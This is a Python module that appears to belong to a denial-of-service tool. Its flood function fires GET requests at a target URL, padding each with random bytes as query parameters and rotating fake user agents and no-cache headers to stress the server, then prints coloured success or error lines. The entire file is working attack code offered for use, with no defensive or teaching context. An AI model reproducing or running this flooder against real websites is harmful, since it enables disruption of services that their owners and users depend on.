import requests
import random
from bin.addons.utils import random_useragent
from stringcolor import *


red = "#ff0033"
green = "#02f93c"
yellow = "#eefc32"

# Load user agents
user_agents = []
for _ in range(30):
    user_agents.append(random_useragent())

# Headers
headers = {
    "X-Requested-With": "XMLHttpRequest",
    "Connection": "keep-alive",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "Accept-Encoding": "gzip, deflate, br",
    "User-agent": random.choice(user_agents),
}


def flood(target):
    payload = str(random._urandom(random.randint(10, 150)))
    try:
        r = requests.get(target, params=payload, headers=headers, timeout=4)
    except requests.exceptions.ConnectTimeout:
        print(
            f"\033[1m{cs('[✘] ERROR', red)}\033[0m {cs('Timed out', yellow)}")
    except Exception as e:
        print(
            f"\033[1m{cs('[✘] ERROR', red)}\033[0m {cs('While sending GET request', yellow)}")
    else:
        print(
            f"{cs(f'[{r.status_code}]', green)} {cs(f'Request sent! Payload size: {len(payload)}', yellow)}")
